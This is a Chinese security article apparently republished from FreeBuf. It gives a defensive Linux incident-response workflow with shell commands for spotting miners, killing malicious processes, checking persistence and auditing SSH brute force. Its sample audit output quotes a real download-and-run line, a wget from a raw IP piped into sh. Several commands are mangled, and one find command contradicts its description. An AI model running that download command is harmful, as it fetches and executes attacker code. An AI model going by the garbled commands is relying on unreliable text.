## 概述

**Linux环境下处理应急响应事件往往会更加的棘手，因为相比于Windows，Linux没有像Autorun、procexp这样的应急响应利器，也没有统一的应急响应处理流程。所以，这篇文章将会对Linux环境下的应急响应流程进行讲解，并且提供每一个环节中所用到的shell命令，以帮助大家快速、系统化地处理Linux环境下的病毒。**

处理Linux应急响应主要分为这4个环节:识别现象-> 清除病毒-> 闭环兜底-> 系统加固。

首先从用户场景的主机异常现象出发，先识别出病毒的可疑现象。

然后定位到具体的病毒进程以及病毒文件，进行清除。

完成前2步还不够，病毒一般会通过一些自启动项及守护程序进行重复感染，所以我们要执行闭环兜底确保病毒不再被创建。

将主机上的病毒项清除干净后，最后就是进行系统加固了，防止病毒从Web再次入侵进来。

走完这4个环节，才能算是一个应急响应流程的结束。

![](https://image.3001.net/images/20191030/1572397482_5db8e1aaddd75.png!small)

## 识别现象

第1个环节要求我们通过系统运行状态、安全设备告警，发现主机异常现象，以及确认病毒的可疑行为。

系统CPU是否异常

枚举进程，CPU降序排序：top

![](https://image.3001.net/images/20191030/1572397567_5db8e1ff10298.png!small)

CPU占用率超过70%且名字比较可疑的进程，大概率就是挖矿病毒了。

![](https://image.3001.net/images/20191030/1572397595_5db8e21bc86f4.png!small)

是否存在可疑进程

枚举进程命令行：ps -aux

![](https://image.3001.net/images/20191030/1572397628_5db8e23c4a1df.png!small)

病毒一般都携带可疑的命令行，当你发现命令行中带有url等奇怪的字符串时，就要注意了，它很可能是个病毒downloader。

![](https://image.3001.net/images/20191030/1572397647_5db8e24fd04a4.png!small)

### 安全网关有无报警

从安全网关报警中识别出威胁是最直接，但确认主机已经感染了病毒只是第一步，接下来得定位，具体是哪个进程在与C&C通信。

![](https://image.3001.net/images/20191030/1572397697_5db8e2811a9a1.png!small)

监控与目标IP通信的进程：

while true; do netstat -antp | grep [ip]; done

![](https://image.3001.net/images/20191030/1572397761_5db8e2c1de346.png!small)

有时安全网关检测到的不全是恶意IP，还有可能是个域名，这种情况下，域名对应的IP是变化的，我们不能直接用上述方法进行监控。

![](https://image.3001.net/images/20191030/1572397786_5db8e2daac63b.png!small)

我们可以先在host文件中添加一条规则，将恶意域名重定向到一个随机的IP地址，然后对其进行监控。

![](https://image.3001.net/images/20191030/1572397806_5db8e2ee9fa02.png!small)

这样就能得到与之通信的恶意进程了。

![](https://image.3001.net/images/20191030/1572397838_5db8e30e48763.png!small)

### 有无可疑历史命令

遍历主机历史命令，查找有无恶意命令：history

![](https://image.3001.net/images/20191030/1572397866_5db8e32ad6ab8.png!small)

## 清除病毒

从第1个环节追溯到的进程信息，将会帮助我们定位到病毒进程&病毒文件，实现清除。

### 结束病毒进程

清除可疑进程的进程链：

    
    
    ps -elf | grep [pid] kill -9 [pid]

![](https://image.3001.net/images/20191030/1572397962_5db8e38ae8d29.png!small)

### 删除病毒文件

定位病毒进程对应的文件路径：

    
    
    ls -al /proc/[pid]/exe rm -f [exe_path]

![](https://image.3001.net/images/20191030/1572398282_5db8e4ca34628.png!small)

## 闭环兜底

Linux下的病毒持久化驻留方式相比于Windows较少，主要以下4种方式。

### 检查是否存在可疑定时任务

枚举定时任务：crontab-l

![](https://image.3001.net/images/20191030/1572398496_5db8e5a0d985e.png!small)

查看anacron异步定时任务：cat/etc/anacrontab

![](https://image.3001.net/images/20191030/1572398519_5db8e5b7b440c.png!small)

### 检查是否存在可疑服务

枚举主机所有服务，查看是否有恶意服务：

    
    
    service--status-all

检查系统文件是否被劫持

枚举系统文件夹的文件，按修改事件排序查看7天内被修改过的文件：

    
    
    find /usr/bin/ /usr/sbin/ /bin/ /usr/local/bin/ -type f -mtime +7 | xargs ls -la

检查是否存在病毒守护进程

监控守护进程的行为：lsof-p[pid]

![](https://image.3001.net/images/20191030/1572398848_5db8e7004b8b2.png!small)

    
    
    strace-tt-T -etrace=all-p$pid

### 扫描是否存在恶意驱动

枚举/扫描系统驱动：lsmod

安装chkrootkit进行扫描：

    
    
    wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gztar zxvf chkrootkit.tar.gzcd chkrootkit-0.52make sense./chkrootkit

安装rkhunter进行扫描：

    
    
    Wget<https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz>
    
    tar -zxvf rkhunter-1.4.4.tar.gz
    
    cd rkhunter-1.4.4
    
    ./installer.sh --install
    
    rkhunter -c

最后一个环节往往是大家比较容易遗忘的，Linux平台下90%的病毒是通过网络传播感染的，所以，你的主机之所以会感染病毒，大部分原因也是因为Web安全防护不够，赶紧检查一下。

修改SSH弱密码

查询log主机登陆日志：

    
    
    grep "Accepted " /var/log/secure* | awk '{print $1,$2,$3,$9,$11}'

定位有爆破的源IP：

    
    
    grep "Failed password" /var/log/secure|grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"|uniq -c

爆破日志的用户名密码：

    
    
    grep "Failed password" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr

SSH爆破是Linux病毒最常用的传播手段，若存在弱密码的主机很容易被其他感染主机SSH爆破成功，从而再次感染病毒。

### 添加命令审计

为历史的命令增加登录的IP地址、执行命令时间等信息：

 **[1]保存1万条命令：**

    
    
    sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile

 **[2]在/etc/profile的文件尾部添加如下行数配置信息：**

    
    
     USER_IP=`who -u am i 2>/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'`
    
    if [ "$USER_IP" = "" ]
    
    then
    
    USER_IP=`hostname`
    
    fi 
    
    export HISTTIMEFORMAT="%F %T $USER_IP `whoami` "  
    
    shopt -s histappend  
    
    export PROMPT_COMMAND="history -a"

 **[3]让配置生效：**

    
    
    source /etc/profile

生成效果：

    
    
    762019-10-2817:05:34113.110.229.230 wget -q -T180 -O-<http://103.219.112.66:8000/i.sh>) | sh

### 打上常见Web漏洞补丁

> structs2系列RCE漏洞
>
> thinkphp5.XRCE漏洞
>
> Redis未授权访问漏洞
>
> ConfluenceRCE漏洞（CVE_2019_3396）
>
> DrupalRCE漏洞（CVE-2018-7600）
>
> ThinkPHPRCE漏洞（CVE-2019-9082）

## 结尾

Linux平台下的恶意软件威胁以僵尸网络蠕虫和挖矿病毒为主，由于Linux大多作为服务器暴露在公网，且Web应用的漏洞层出不穷，所以很容易被大范围入侵，如常见的病毒：DDG、systemdMiner、BillGates、watchdogs、XorDDos，在很多Linux上都有。大家要养成不使用弱密码、勤打补丁的好习惯。

 ***本文作者：深信服千里目安全实验室，转载请注明来自FreeBuf.COM**

